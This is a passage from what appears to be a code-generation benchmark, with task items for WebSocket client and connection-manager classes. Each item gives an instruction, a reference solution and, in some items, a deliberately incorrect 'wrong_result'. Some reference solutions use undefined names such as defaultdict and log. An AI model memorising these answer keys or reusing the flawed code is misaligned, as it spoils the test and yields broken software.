headers_received(start_line: Union[RequestStartLine, ResponseStartLine], headers: HTTPHeaders) -> Awaitable[None] - Processes received headers\n- write_message(message: Union[str, bytes, Dict[str, Any]], binary: bool) -> Future[None] - Sends a WebSocket message\n- read_message(callback: Optional[Callable]) -> Awaitable[Union[None, str, bytes]] - Reads a message from the queue\n- _on_message(message: Union[None, str, bytes]) -> Optional[Awaitable[None]] - Internal message handler\n- ping(data: bytes) -> None - Sends a ping frame\n- get_websocket_protocol() -> WebSocketProtocol - Creates the WebSocket protocol handler",
    "Canonical_solution": "import abc\nimport asyncio\nimport base64\nimport hashlib\nimport os\nimport struct\nimport tornado\nfrom urllib.parse import urlparse\nimport zlib\nfrom tornado.concurrent import Future\nfrom tornado.escape import utf8, native_str, to_unicode\nfrom tornado import gen, httpclient, httputil\nfrom tornado.ioloop import IOLoop, PeriodicCallback\nfrom tornado.iostream import StreamClosedError, IOStream\nfrom tornado.log import app_log\nfrom tornado.netutil import Resolver\nfrom tornado import simple_httpclient\nfrom tornado.queues import Queue\nfrom tornado.tcpclient import TCPClient\nfrom tornado.util import _websocket_mask\nfrom typing import Optional, Dict, Union, List, Awaitable, Callable, Tuple, Type, Any, cast\n\n_default_max_message_size = 10 * 1024 * 1024\n\nclass WebSocketClientConnection(simple_httpclient._HTTPConnection):\n    def __init__(\n        self,\n        request: httpclient.HTTPRequest,\n        on_message_callback: Optional[Callable[[Union[None, str, bytes]], None]] = None,\n        compression_options: Optional[Dict[str, Any]] = None,\n        ping_interval: Optional[float] = None,\n        ping_timeout: Optional[float] = None,\n        max_message_size: int = _default_max_message_size,\n        subprotocols: Optional[List[str]] = None,\n        resolver: Optional[Resolver] = None,\n    ) -> None:\n        self.connect_future = Future()\n        self.read_queue = Queue(1)\n        self.key = base64.b64encode(os.urandom(16))\n        self._on_message_callback = on_message_callback\n        self.close_code = None\n        self.close_reason = None\n        self.params = _WebSocketParams(\n            ping_interval=ping_interval,\n            ping_timeout=ping_timeout,\n            max_message_size=max_message_size,\n            compression_options=compression_options,\n        )\n\n        scheme, sep, rest = request.url.partition(\":\")\n        scheme = {\"ws\": \"http\", \"wss\": \"https\"}[scheme]\n        request.url = scheme + sep + rest\n        request.headers.update(\n            {\n                \"Upgrade\": \"websocket\",\n                \"Connection\": \"Upgrade\",\n                \"Sec-WebSocket-Key\": to_unicode(self.key),\n                \"Sec-WebSocket-Version\": \"13\",\n            }\n        )\n        if subprotocols is not None:\n            request.headers[\"Sec-WebSocket-Protocol\"] = \",\".join(subprotocols)\n        if compression_options is not None:\n            request.headers[\"Sec-WebSocket-Extensions\"] = (\n                \"permessage-deflate; client_max_window_bits\"\n            )\n\n        request.follow_redirects = False\n\n        self.tcp_client = TCPClient(resolver=resolver)\n        super().__init__(\n            None,\n            request,\n            lambda: None,\n            self._on_http_response,\n            104857600,\n            self.tcp_client,\n            65536,\n            104857600,\n        )\n\n    def close(self, code: Optional[int] = None, reason: Optional[str] = None) -> None:\n        if self.protocol is not None:\n            self.protocol.close(code, reason)\n            self.protocol = None\n\n    def on_connection_close(self) -> None:\n        if not self.connect_future.done():\n            self.connect_future.set_exception(StreamClosedError())\n        self._on_message(None)\n        self.tcp_client.close()\n        super().on_connection_close()\n\n    def on_ws_connection_close(\n        self, close_code: Optional[int] = None, close_reason: Optional[str] = None\n    ) -> None:\n        self.close_code = close_code\n        self.close_reason = close_reason\n        self.on_connection_close()\n\n    def _on_http_response(self, response: httpclient.HTTPResponse) -> None:\n        if not self.connect_future.done():\n            if response.error:\n                self.connect_future.set_exception(response.error)\n            else:\n                self.connect_future.set_exception(\n                    WebSocketError(\"Non-websocket response\")\n                )\n\n    async def headers_received(\n        self,\n        start_line: Union[httputil.RequestStartLine, httputil.ResponseStartLine],\n        headers: httputil.HTTPHeaders,\n    ) -> None:\n        assert isinstance(start_line, httputil.ResponseStartLine)\n        if start_line.code != 101:\n            await super().headers_received(start_line, headers)\n            return\n\n        if self._timeout is not None:\n            self.io_loop.remove_timeout(self._timeout)\n            self._timeout = None\n\n        self.headers = headers\n        self.protocol = self.get_websocket_protocol()\n        self.protocol._process_server_headers(self.key, self.headers)\n        self.protocol.stream = self.connection.detach()\n\n        IOLoop.current().add_callback(self.protocol._receive_frame_loop)\n        self.protocol.start_pinging()\n\n        self.final_callback = None\n        future_set_result_unless_cancelled(self.connect_future, self)\n\n    def write_message(\n        self, message: Union[str, bytes, Dict[str, Any]], binary: bool = False\n    ) -> \"Future[None]\":\n        if self.protocol is None:\n            raise WebSocketClosedError(\"Client connection has been closed\")\n        return self.protocol.write_message(message, binary=binary)\n\n    def read_message(\n        self,\n        callback: Optional[Callable[[\"Future[Union[None, str, bytes]]\"], None]] = None,\n    ) -> Awaitable[Union[None, str, bytes]]:\n        awaitable = self.read_queue.get()\n        if callback is not None:\n            self.io_loop.add_future(asyncio.ensure_future(awaitable), callback)\n        return awaitable\n\n    def _on_message(\n        self, message: Union[None, str, bytes]\n    ) -> Optional[Awaitable[None]]:\n        if self._on_message_callback:\n            self._on_message_callback(message)\n            return None\n        else:\n            return self.read_queue.put(message)\n\n    def ping(self, data: bytes = b\"\") -> None:\n        data = utf8(data)\n        if self.protocol is None:\n            raise WebSocketClosedError()\n        self.protocol.write_ping(data)\n\n    def get_websocket_protocol(self) -> \"WebSocketProtocol\":\n        return WebSocketProtocol13(self, mask_outgoing=True, params=self.params)\n\n    @property\n    def selected_subprotocol(self) -> Optional[str]:\n        return self.protocol.selected_subprotocol\n\nclass _WebSocketParams:\n    def __init__(\n        self,\n        ping_interval: Optional[float] = None,\n        ping_timeout: Optional[float] = None,\n        max_message_size: int = _default_max_message_size,\n        compression_options: Optional[Dict[str, Any]] = None,\n    ) -> None:\n        self.ping_interval = ping_interval\n        self.ping_timeout = ping_timeout\n        self.max_message_size = max_message_size\n        self.compression_options = compression_options\n\nclass WebSocketProtocol(abc.ABC):\n    def __init__(self, handler: Any) -> None:\n        self.handler = handler\n        self.stream = None\n        self.client_terminated = False\n        self.server_terminated = False\n\n    def close(self, code: Optional[int] = None, reason: Optional[str] = None) -> None:\n        raise NotImplementedError()\n\n    def is_closing(self) -> bool:\n        raise NotImplementedError()\n\n    async def accept_connection(self, handler: Any) -> None:\n        raise NotImplementedError()\n\n    def write_message(\n        self, message: Union[str, bytes, Dict[str, Any]], binary: bool = False\n    ) -> \"Future[None]\":\n        raise NotImplementedError()\n\n    @property\n    def selected_subprotocol(self) -> Optional[str]:\n        raise NotImplementedError()\n\n    def write_ping(self, data: bytes) -> None:\n        raise NotImplementedError()\n\n    def _process_server_headers(\n        self, key: Union[str, bytes], headers: httputil.HTTPHeaders\n    ) -> None:\n        raise NotImplementedError()\n\n    def start_pinging(self) -> None:\n        raise NotImplementedError()\n\n    async def _receive_frame_loop(self) -> None:\n        raise NotImplementedError()\n\n    def set_nodelay(self, x: bool) -> None:\n        raise NotImplementedError()\n\nclass WebSocketProtocol13(WebSocketProtocol):\n    FIN = 0x80\n    RSV1 = 0x40\n    RSV2 = 0x20\n    RSV3 = 0x10\n    RSV_MASK = RSV1 | RSV2 | RSV3\n    OPCODE_MASK = 0x0F\n\n    def __init__(\n        self,\n        handler: Any,\n        mask_outgoing: bool,\n        params: _WebSocketParams,\n    ) -> None:\n        super().__init__(handler)\n        self.mask_outgoing = mask_outgoing\n        self.params = params\n        self._final_frame = False\n        self._frame_opcode = None\n        self._frame_mask = None\n        self._frame_length = None\n        self._fragmented_message_buffer = None\n        self._fragmented_message_opcode = None\n        self._waiting = None\n        self._compression_options = params.compression_options\n        self._decompressor = None\n        self._compressor = None\n        self._frame_compressed = None\n        self._message_bytes_in = 0\n        self._message_bytes_out = 0\n        self._wire_bytes_in = 0\n        self._wire_bytes_out = 0\n        self.ping_callback = None\n        self.last_ping = 0.0\n        self.last_pong = 0.0\n        self.close_code = None\n        self.close_reason = None\n\n    @property\n    def selected_subprotocol(self) -> Optional[str]:\n        return self._selected_subprotocol\n\n    @selected_subprotocol.setter\n    def selected_subprotocol(self, value: Optional[str]) -> None:\n        self._selected_subprotocol = value\n\n    def _process_server_headers(\n        self, key: Union[str, bytes], headers: httputil.HTTPHeaders\n    ) -> None:\n        assert headers[\"Upgrade\"].lower() == \"websocket\"\n        assert headers[\"Connection\"].lower() == \"upgrade\"\n        accept = self.compute_accept_value(key)\n        assert headers[\"Sec-Websocket-Accept\"] == accept\n\n        extensions = self._parse_extensions_header(headers)\n        for ext in extensions:\n            if ext[0] == \"permessage-deflate\" and self._compression_options is not None:\n                self._create_compressors(\"client\", ext[1])\n            else:\n                raise ValueError(\"unsupported extension %r\", ext)\n\n        self.selected_subprotocol = headers.get(\"Sec-WebSocket-Protocol\", None)\n\n    def write_message(\n        self, message: Union[str, bytes, Dict[str, Any]], binary: bool = False\n    ) -> \"Future[None]\":\n        if binary:\n            opcode = 0x2\n        else:\n            opcode = 0x1\n        if isinstance(message, dict):\n            message = tornado.escape.json_encode(message)\n        message = tornado.escape.utf8(message)\n        assert isinstance(message, bytes)\n        self._message_bytes_out += len(message)\n        flags = 0\n        if self._compressor:\n            message = self._compressor.compress(message)\n            flags |= self.RSV1\n        try:\n            fut = self._write_frame(True, opcode, message, flags=flags)\n        except StreamClosedError:\n            raise WebSocketClosedError()\n\n        async def wrapper() -> None:\n            try:\n                await fut\n            except StreamClosedError:\n                raise WebSocketClosedError()\n\n        return asyncio.ensure_future(wrapper())\n\n    def write_ping(self, data: bytes) -> None:\n        assert isinstance(data, bytes)\n        self._write_frame(True, 0x9, data)\n\n    def close(self, code: Optional[int] = None, reason: Optional[str] = None) -> None:\n        if not self.server_terminated:\n            if not self.stream.closed():\n                if code is None and reason is not None:\n                    code = 1000\n                if code is None:\n                    close_data = b\"\"\n                else:\n                    close_data = struct.pack(\">H\", code)\n                if reason is not None:\n                    close_data += utf8(reason)\n                try:\n                    self._write_frame(True, 0x8, close_data)\n                except StreamClosedError:\n                    self._abort()\n            self.server_terminated = True\n        if self.client_terminated:\n            if self._waiting is not None:\n                self.stream.io_loop.remove_timeout(self._waiting)\n                self._waiting = None\n            self.stream.close()\n        elif self._waiting is None:\n            self._waiting = self.stream.io_loop.add_timeout(\n                self.stream.io_loop.time() + 5, self._abort\n            )\n        if self.ping_callback:\n            self.ping_callback.stop()\n            self.ping_callback = None\n\n    def is_closing(self) -> bool:\n        return self.stream.closed() or self.client_terminated or self.server_terminated\n\n    def start_pinging(self) -> None:\n        if self.ping_interval is not None and self.ping_interval > 0:\n            self.last_ping = self.last_pong = IOLoop.current().time()\n            self.ping_callback = PeriodicCallback(\n                self.periodic_ping, self.ping_interval * 1000\n            )\n            self.ping_callback.start()\n\n    @staticmethod\n    def compute_accept_value(key: Union[str, bytes]) -> str:\n        sha1 = hashlib.sha1()\n        sha1.update(utf8(key))\n        sha1.update(b\"258EAFA5-E914-47DA-95CA-C5AB0DC85B11\")\n        return native_str(base64.b64encode(sha1.digest()))\n\n    def _parse_extensions_header(\n        self, headers: httputil.HTTPHeaders\n    ) -> List[Tuple[str, Dict[str, str]]]:\n        extensions = headers.get(\"Sec-WebSocket-Extensions\", \"\")\n        if extensions:\n            return [httputil._parse_header(e.strip()) for e in extensions.split(\",\")]\n        return []\n\n    def _write_frame(\n        self, fin: bool, opcode: int, data: bytes, flags: int = 0\n    ) -> \"Future[None]\":\n        data_len = len(data)\n        if opcode & 0x8:\n            if not fin:\n                raise ValueError(\"control frames may not be fragmented\")\n            if data_len > 125:\n                raise ValueError(\"control frame payloads may not exceed 125 bytes\")\n        if fin:\n            finbit = self.FIN\n        else:\n            finbit = 0\n        frame = struct.pack(\"B\", finbit | opcode | flags)\n        if self.mask_outgoing:\n            mask_bit = 0x80\n        else:\n            mask_bit = 0\n        if data_len < 126:\n            frame += struct.pack(\"B\", data_len | mask_bit)\n        elif data_len <= 0xFFFF:\n            frame += struct.pack(\"!BH\", 126 | mask_bit, data_len)\n        else:\n            frame += struct.pack(\"!BQ\", 127 | mask_bit, data_len)\n        if self.mask_outgoing:\n            mask = os.urandom(4)\n            data = mask + _websocket_mask(mask, data)\n        frame += data\n        self._wire_bytes_out += len(frame)\n        return self.stream.write(frame)\n\ndef websocket_connect(\n    url: Union[str, httpclient.HTTPRequest],\n    callback: Optional[Callable[[\"Future[WebSocketClientConnection]\"], None]] = None,\n    connect_timeout: Optional[float] = None,\n    on_message_callback: Optional[Callable[[Union[None, str, bytes]], None]] = None,\n    compression_options: Optional[Dict[str, Any]] = None,\n    ping_interval: Optional[float] = None,\n    ping_timeout: Optional[float] = None,\n    max_message_size: int = _default_max_message_size,\n    subprotocols: Optional[List[str]] = None,\n    resolver: Optional[Resolver] = None,\n) -> \"Awaitable[WebSocketClientConnection]\":\n    if isinstance(url, httpclient.HTTPRequest):\n        assert connect_timeout is None\n        request = url\n        request.headers = httputil.HTTPHeaders(request.headers)\n    else:\n        request = httpclient.HTTPRequest(url, connect_timeout=connect_timeout)\n    request = cast(\n        httpclient.HTTPRequest,\n        httpclient._RequestProxy(request, httpclient.HTTPRequest._DEFAULTS),\n    )\n    conn = WebSocketClientConnection(\n        request,\n        on_message_callback=on_message_callback,\n        compression_options=compression_options,\n        ping_interval=ping_interval,\n        ping_timeout=ping_timeout,\n        max_message_size=max_message_size,\n        subprotocols=subprotocols,\n        resolver=resolver,\n    )\n    if callback is not None:\n        IOLoop.current().add_future(conn.connect_future, callback)\n    return conn.connect_future",
    "Code_level": "Class-level",
    "FSMID_for_test": 51,
    "wrong_result": "```python\nimport tornado.ioloop\nimport tornado.websocket\nimport tornado.tcpclient\nfrom tornado.httpclient import HTTPRequest, HTTPResponse, HTTPHeaders\nfrom tornado.httputil import RequestStartLine, ResponseStartLine\nfrom tornado.iostream import StreamClosedError\nfrom typing import Optional, Callable, Dict, List, Any, Union, Awaitable\nfrom concurrent.futures import Future\nfrom collections import deque\n\nclass WebSocketClientConnection(tornado.websocket.WebSocketClientConnection):\n    def __init__(self, request: HTTPRequest, on_message_callback: Optional[Callable], compression_options: Optional[Dict], ping_interval: Optional[float], ping_timeout: Optional[float], max_message_size: int, subprotocols: Optional[List[str]], resolver: Optional[tornado.netutil.Resolver]):\n        super().__init__(request, on_message_callback, compression_options, ping_interval, ping_timeout, max_message_size, subprotocols, resolver)\n        self.connect_future = Future()\n        self.read_queue = deque()\n        self.key = b''\n        self._on_message_callback = on_message_callback\n        self.close_code = None\n        self.close_reason = None\n        self.params = _WebSocketParams()\n        self.tcp_client = tornado.tcpclient.TCPClient()\n        self.protocol = None\n\n    def close(self, code: Optional[int] = None, reason: Optional[str] = None) -> None:\n        if self.protocol:\n            self.protocol.close(code, reason)\n\n    def on_connection_close(self) -> None:\n        self.connect_future.set_exception(StreamClosedError(\"Connection closed\"))\n\n    def on_ws_connection_close(self, close_code: Optional[int], close_reason: Optional[str]) -> None:\n        self.close_code = close_code\n        self.close_reason = close_reason\n        self.on_connection_close()\n\n    def _on_http_response(self, response: HTTPResponse) -> None:\n        pass\n\n    async def headers_received(self, start_line: Union[RequestStartLine, ResponseStartLine], headers: HTTPHeaders) -> Awaitable[None]:\n        pass\n\n    def write_message(self, message: Union[str, bytes, Dict[str, Any]], binary: bool = False) -> Future[None]:\n        if self.protocol:\n            return self.protocol.write_message(message, binary)\n        else:\n            future = Future()\n            future.set_exception(Exception(\"Not connected\"))\n            return future\n\n    async def read_message(self, callback: Optional[Callable] = None) -> Awaitable[Union[None, str, bytes]]:\n        while not self.read_queue:\n            await tornado.gen.sleep(0.1)\n        return self.read_queue.popleft()\n\n    def _on_message(self, message: Union[None, str, bytes]) -> Optional[Awaitable[None]]:\n        if message is not None:\n            self.read_queue.append(message)\n        if self._on_message_callback:\n            self._on_message_callback(message)\n\n    def ping(self, data: bytes) -> None:\n        if self.protocol:\n            self.protocol.ping(data)\n\n    def get_websocket_protocol(self) -> tornado.websocket.WebSocketProtocol:\n        return tornado.websocket.WebSocketProtocol(self)\n\n# Helper class for WebSocket parameters\nclass _WebSocketParams:\n    pass\n```"
  },
  {
    "Task_id": 439,
    "Instruction": "Task Description: Implement a WebSocket client class for streaming financial market data with authentication, subscription management, and message handling capabilities.\n\nClass Description: The _DataStream class establishes and maintains a WebSocket connection to a financial data streaming service. It handles authentication, manages subscriptions to different types of market data (trades, quotes, bars), processes incoming messages, and provides methods for controlling the connection lifecycle.\n\nAttributes:\n- _endpoint: str - WebSocket server URL\n- _key_id: str - API key for authentication\n- _secret_key: str - API secret for authentication\n- _ws: WebSocketClientProtocol - Active WebSocket connection\n- _running: bool - Connection status flag\n- _loop: asyncio.AbstractEventLoop - Event loop reference\n- _raw_data: bool - Flag for raw data processing\n- _stop_stream_queue: queue.Queue - Queue for stop signals\n- _handlers: Dict[str, Dict] - Dictionary of message handlers per data type\n- _name: str - Connection name identifier\n- _should_run: bool - Control flag for main loop\n- _max_frame_size: int - Maximum WebSocket frame size\n- _websocket_params: Dict - WebSocket connection parameters\n\nMethods:\n- __init__(endpoint: str, key_id: str, secret_key: str, raw_data: bool = False, websocket_params: Optional[Dict] = None) -> None - Initialize the data stream with connection parameters\n- _connect() -> None - Establish WebSocket connection\n- _auth() -> None - Authenticate with the server\n- _start_ws() -> None - Combined connection and authentication\n- close() -> None - Close the WebSocket connection\n- stop_ws() -> None - Signal to stop the WebSocket connection\n- _consume() -> None - Main message processing loop\n- _dispatch(msg: Dict) -> None - Route messages to appropriate handlers\n- _subscribe(handler: Callable, symbols: List[str], handlers: Dict) -> None - Internal subscription management\n- _subscribe_all() -> None - Send all active subscriptions to server\n- _run_forever() -> None - Main connection management loop\n- subscribe_trades(handler: Callable, *symbols: str) -> None - Subscribe to trade data\n- subscribe_quotes(handler: Callable, *symbols: str) -> None - Subscribe to quote data\n- subscribe_bars(handler: Callable, *symbols: str) -> None - Subscribe to bar data\n- subscribe_updated_bars(handler: Callable, *symbols: str) -> None - Subscribe to updated bar data\n- subscribe_daily_bars(handler: Callable, *symbols: str) -> None - Subscribe to daily bar data\n- stop() -> None - Stop the WebSocket connection and processing",
    "Canonical_solution": "import asyncio\nimport websockets\nimport msgpack\nimport queue\nfrom typing import Dict, Optional\n\nclass _DataStream:\n    def __init__(self,\n                 endpoint: str,\n                 key_id: str,\n                 secret_key: str,\n                 raw_data: bool = False,\n                 websocket_params: Optional[Dict] = None) -> None:\n        self._endpoint = endpoint\n        self._key_id = key_id\n        self._secret_key = secret_key\n        self._ws = None\n        self._running = False\n        self._loop = None\n        self._raw_data = raw_data\n        self._stop_stream_queue = queue.Queue()\n        self._handlers = {\n            'trades':      {},\n            'quotes':      {},\n            'bars':        {},\n            'updatedBars': {},\n            'dailyBars':   {},\n        }\n        self._name = 'data'\n        self._should_run = True\n        self._max_frame_size = 32768\n        self._websocket_params = websocket_params or {\n            \"ping_interval\": 10,\n            \"ping_timeout\": 180,\n            \"max_queue\": 1024,\n        }\n\n    async def _connect(self):\n        self._ws = await websockets.connect(\n            self._endpoint,\n            extra_headers={'Content-Type': 'application/msgpack'},\n            **self._websocket_params\n        )\n        r = await self._ws.recv()\n        msg = msgpack.unpackb(r)\n        if msg[0]['T'] != 'success' or msg[0]['msg'] != 'connected':\n            raise ValueError('connected message not received')\n\n    async def _auth(self):\n        await self._ws.send(\n            msgpack.packb({\n                'action': 'auth',\n                'key':    self._key_id,\n                'secret': self._secret_key,\n            }))\n        r = await self._ws.recv()\n        msg = msgpack.unpackb(r)\n        if msg[0]['T'] == 'error':\n            raise ValueError(msg[0].get('msg', 'auth failed'))\n        if msg[0]['T'] != 'success' or msg[0]['msg'] != 'authenticated':\n            raise ValueError('failed to authenticate')\n\n    async def _start_ws(self):\n        await self._connect()\n        await self._auth()\n\n    async def close(self):\n        if self._ws:\n            await self._ws.close()\n            self._ws = None\n            self._running = False\n\n    async def stop_ws(self):\n        self._should_run = False\n        if self._stop_stream_queue.empty():\n            self._stop_stream_queue.put_nowait({\"should_stop\": True})\n\n    async def _consume(self):\n        while True:\n            if not self._stop_stream_queue.empty():\n                self._stop_stream_queue.get(timeout=1)\n                await self.close()\n                break\n            else:\n                try:\n                    r = await asyncio.wait_for(self._ws.recv(), 5)\n                    msgs = msgpack.unpackb(r)\n                    for msg in msgs:\n                        await self._dispatch(msg)\n                except asyncio.TimeoutError:\n                    pass\n\n    async def _dispatch(self, msg):\n        msg_type = msg.get('T')\n        symbol = msg.get('S')\n        if msg_type == 't':\n            handler = self._handlers['trades'].get(\n                symbol, self._handlers['trades'].get('*', None))\n            if handler:\n                await handler(self._cast(msg_type, msg))\n        elif msg_type == 'q':\n            handler = self._handlers['quotes'].get(\n                symbol, self._handlers['quotes'].get('*', None))\n            if handler:\n                await handler(self._cast(msg_type, msg))\n        elif msg_type == 'b':\n            handler = self._handlers['bars'].get(\n                symbol, self._handlers['bars'].get('*', None))\n            if handler:\n                await handler(self._cast(msg_type, msg))\n        elif msg_type == 'u':\n            handler = self._handlers['updatedBars'].get(\n                symbol, self._handlers['updatedBars'].get('*', None))\n            if handler:\n                await handler(self._cast(msg_type, msg))\n        elif msg_type == 'd':\n            handler = self._handlers['dailyBars'].get(\n                symbol, self._handlers['dailyBars'].get('*', None))\n            if handler:\n                await handler(self._cast(msg_type, msg))\n        elif msg_type == 'error':\n            log.error(f'error: {msg.get(\"msg\")} ({msg.get(\"code\")})')\n\n    def _subscribe(self, handler, symbols, handlers):\n        for symbol in symbols:\n            handlers[symbol] = handler\n        if self._running:\n            asyncio.run_coroutine_threadsafe(\n                self._subscribe_all(), self._loop\n            ).result()\n\n    async def _subscribe_all(self):\n        msg = defaultdict(list)\n        for k, v in self._handlers.items():\n            if v:\n                for s in v.keys():\n                    msg[k].append(s)\n        msg['action'] = 'subscribe'\n        bs = msgpack.packb(msg)\n        frames = (bs[i:i+self._max_frame_size]\n                  for i in range(0, len(bs), self._max_frame_size))\n        await self._ws.send(frames)\n\n    async def _run_forever(self):\n        self._loop = asyncio.get_running_loop()\n        while not any(v for k, v in self._handlers.items()):\n            if not self._stop_stream_queue.empty():\n                self._stop_stream_queue.get(timeout=1)\n                return\n            await asyncio.sleep(0.1)\n        self._should_run = True\n        self._running = False\n        while True:\n            try:\n                if not self._should_run:\n                    return\n                if not self._running:\n                    await self._start_ws()\n                    await self._subscribe_all()\n                    self._running = True\n                await self._consume()\n            except websockets.WebSocketException as wse:\n                await self.close()\n                self._running = False\n            finally:\n                await asyncio.sleep(0.01)\n\n    def subscribe_trades(self, handler, *symbols):\n        self._subscribe(handler, symbols, self._handlers['trades'])\n\n    def subscribe_quotes(self, handler, *symbols):\n        self._subscribe(handler, symbols, self._handlers['quotes'])\n\n    def subscribe_bars(self, handler, *symbols):\n        self._subscribe(handler, symbols, self._handlers['bars'])\n\n    def subscribe_updated_bars(self, handler, *symbols):\n        self._subscribe(handler, symbols, self._handlers['updatedBars'])\n\n    def subscribe_daily_bars(self, handler, *symbols):\n        self._subscribe(handler, symbols, self._handlers['dailyBars'])\n\n    def stop(self):\n        if self._loop.is_running():\n            asyncio.run_coroutine_threadsafe(\n                self.stop_ws(),\n                self._loop).result()",
    "Code_level": "Class-level",
    "FSMID_for_test": 46,
    "wrong_result": "```python\nimport asyncio\nimport json\nimport queue\nfrom typing import Any, Callable, Dict, List, Optional\n\nclass WebSocketClientProtocol(asyncio.Protocol):\n    def __init__(self, loop: asyncio.AbstractEventLoop):\n        self.loop = loop\n        self.transport = None\n        self.buffer = b''\n\n    def connection_made(self, transport: asyncio.BaseTransport) -> None:\n        self.transport = transport\n\n    def data_received(self, data: bytes) -> None:\n        self.buffer += data\n        while True:\n            try:\n                msg, self.buffer = self.buffer.split(b'\\x00', 1)\n                self.handle_message(msg.decode('utf-8'))\n            except ValueError:\n                break\n\n    def handle_message(self, message: str) -> None:\n        pass\n\n    def connection_lost(self, exc: Optional[Exception]) -> None:\n        if exc:\n            print(f\"Connection lost due to {exc}\")\n        else:\n            print(\"Connection closed\")\n\nclass DataStream:\n    def __init__(self, endpoint: str, key_id: str, secret_key: str, raw_data: bool = False, websocket_params: Optional[Dict] = None) -> None:\n        self._endpoint = endpoint\n        self._key_id = key_id\n        self._secret_key = secret_key\n        self._ws = None\n        self._running = False\n        self._loop = asyncio.get_event_loop()\n        self._raw_data = raw_data\n        self._stop_stream_queue = queue.Queue()\n        self._handlers = {'trades': {}, 'quotes': {}, 'bars': {}, 'updated_bars': {}, 'daily_bars': {}}\n        self._name = 'DataStream'\n        self._should_run = True\n        self._max_frame_size = 131072\n        self._websocket_params = websocket_params if websocket_params else {}\n\n    async def _connect(self) -> None:\n        _, self._ws = await self._loop.create_connection(lambda: WebSocketClientProtocol(self._loop), self._endpoint)\n\n    async def _auth(self) -> None:\n        auth_msg = {\n            'type': 'auth',\n            'key_id': self._key_id,\n            'secret_key': self._secret_key\n        }\n        self._ws.transport.write(json.dumps(auth_msg).encode('utf-8') + b'\\x00')\n\n    async def _start_ws(self) -> None:\n        await self._connect()\n        await self._auth()\n\n    def close(self) -> None:\n        if self._ws:\n            self._ws.transport.close()\n\n    def stop_ws(self) -> None:\n        self._stop_stream_queue.put(True)\n\n    async def _consume(self) -> None:\n        while self._should_run:\n            await asyncio.sleep(0.1)\n\n    def _dispatch(self, msg: Dict) -> None:\n        data_type = msg.get('type')\n        if data_type in self._handlers:\n            for handler in self._handlers[data_type].values():\n                handler(msg)\n\n    def _subscribe(self, handler: Callable, symbols: List[str], handlers: Dict) -> None:\n        for symbol in symbols:\n            handlers[symbol] = handler\n\n    def _subscribe_all(self) -> None:\n        pass\n\n    async def _run_forever(self) -> None:\n        await self._start_ws()\n        await self._consume()\n\n    def subscribe_trades(self, handler: Callable, *symbols: str) -> None:\n        self._subscribe(handler, symbols, self._handlers['trades'])\n\n    def subscribe_quotes(self, handler: Callable, *symbols: str) -> None:\n        self._subscribe(handler, symbols, self._handlers['quotes'])\n\n    def subscribe_bars(self, handler: Callable, *symbols: str) -> None:\n        self._subscribe(handler, symbols, self._handlers['bars'])\n\n    def subscribe_updated_bars(self, handler: Callable, *symbols: str) -> None:\n        self._subscribe(handler, symbols, self._handlers['updated_bars'])\n\n    def subscribe_daily_bars(self, handler: Callable, *symbols: str) -> None:\n        self._subscribe(handler, symbols, self._handlers['daily_bars'])\n\n    def stop(self) -> None:\n        self._should_run = False\n        self.close()\n```"
  },
  {
    "Task_id": 447,
    "Instruction": "Task Description: Implement a WebSocket connection manager class for handling multiple client connections, supporting different subprotocols (JSON and BYTES), and managing message sending/receiving.\n\nClass Description: The ConnectionManager class manages active WebSocket connections, handles different WebSocket subprotocols, and provides methods for sending/receiving messages in the appropriate format.\n\nAttributes:\n- active_connections: List[WebSocket] - Maintains a list of currently active WebSocket connections\n- protocol_dict: Dict[str, WebsocketSubProtocols] - Maps client addresses to their chosen subprotocols\n\nMethods:\n- get_client(websocket: WebSocket) -> str - Returns a string identifier for the client (host:port)\n- get_subprotocol(headers: Dict) -> WebsocketSubProtocols - Determines the subprotocol from request headers\n- connect(websocket: WebSocket) -> None - Accepts a new WebSocket connection and stores its subprotocol\n- disconnect(websocket: WebSocket) -> None - Removes a disconnected WebSocket from active connections\n- receive(websocket: WebSocket) -> Any - Receives a message from the WebSocket using the appropriate subprotocol\n- iter(websocket: WebSocket) -> AsyncIterator[Any] - Provides an async iterator for continuously receiving messages\n- send(websocket: WebSocket, data: Union[DataRequest, StatusMessage]) -> None - Sends data through the WebSocket using the appropriate subprotocol",
    "Canonical_solution": "from typing import Any, AsyncIterator, Dict, List, Optional, Union\nfrom fastapi import FastAPI, Response, WebSocket, WebSocketDisconnect, status\nfrom jina.enums import WebsocketSubProtocols\nfrom jina.excepts import InternalNetworkError\nfrom jina.types.request.data import DataRequest\nfrom jina.types.request.status import StatusMessage\n\nclass ConnectionManager:\n    def __init__(self):\n        self.active_connections: List[WebSocket] = []\n        self.protocol_dict: Dict[str, WebsocketSubProtocols] = {}\n\n    def get_client(self, websocket: WebSocket) -> str:\n        return f'{websocket.client.host}:{websocket.client.port}'\n\n    def get_subprotocol(self, headers: Dict):\n        try:\n            if 'sec-websocket-protocol' in headers:\n                subprotocol = WebsocketSubProtocols(headers['sec-websocket-protocol'])\n            elif b'sec-websocket-protocol' in headers:\n                subprotocol = WebsocketSubProtocols(headers[b'sec-websocket-protocol'].decode())\n            else:\n                subprotocol = WebsocketSubProtocols.JSON\n        except Exception:\n            subprotocol = WebsocketSubProtocols.JSON\n        return subprotocol\n\n    async def connect(self, websocket: WebSocket):\n        await websocket.accept()\n        subprotocol = self.get_subprotocol(dict(websocket.scope['headers']))\n        self.active_connections.append(websocket)\n        self.protocol_dict[self.get_client(websocket)] = subprotocol\n\n    def disconnect(self, websocket: WebSocket):\n        self.protocol_dict.pop(self.get_client(websocket))\n        self.active_connections.remove(websocket)\n\n    async def receive(self, websocket: WebSocket) -> Any:\n        subprotocol = self.protocol_dict[self.get_client(websocket)]\n        if subprotocol == WebsocketSubProtocols.JSON:\n            return await websocket.receive_json(mode='text')\n        elif subprotocol == WebsocketSubProtocols.BYTES:\n            return await websocket.receive_bytes()\n\n    async def iter(self, websocket: WebSocket) -> AsyncIterator[Any]:\n        try:\n            while True:\n                yield await self.receive(websocket)\n        except WebSocketDisconnect:\n            pass\n\n    async def send(self, websocket: WebSocket, data: Union[DataRequest, StatusMessage]) -> None:\n        subprotocol = self.protocol_dict[self.get_client(websocket)]\n        if subprotocol == WebsocketSubProtocols.JSON:\n            return await websocket.send_json(data.to_dict(), mode='text')\n        elif subprotocol == WebsocketSubProtocols.BYTES:\n            return await websocket.send_bytes(data.to_bytes())",
    "Code_level": "Class-level",
    "FSMID_for_test": 48,
